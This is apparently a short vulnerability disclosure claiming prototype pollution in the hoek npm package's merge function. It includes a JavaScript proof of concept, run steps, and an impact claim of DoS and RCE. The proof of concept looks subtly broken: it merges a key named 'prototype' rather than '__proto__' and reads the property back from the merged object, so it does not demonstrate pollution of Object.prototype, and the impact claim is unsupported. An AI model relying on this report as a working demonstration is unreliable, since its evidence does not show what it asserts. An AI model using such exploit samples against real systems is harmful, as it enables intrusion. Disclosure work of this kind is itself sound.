# Description
hoek package is vulnerable to prototype pollution issue 
file can be found in https://github.com/hapijs/hoek/blob/master/lib/merge.js
# Proof of Concept 
1. Creating poc file namely poc.js
```js
var utils = require('hoek');
var src = {};
let object = utils.merge({}, JSON.parse('{ "myProperty": "a", "prototype" : { "isAdmin" : true } }'));
console.log(object.prototype.isAdmin);
```
2. Execute command npm install hoek
3. Execute command node poc.js
* https://drive.google.com/file/d/1Vcy1bmKPcaeADxz3EAopuO3cZMlanYcX/view?usp=sharing
# Impact
Prototype pollution which could lead to DOS and RCE
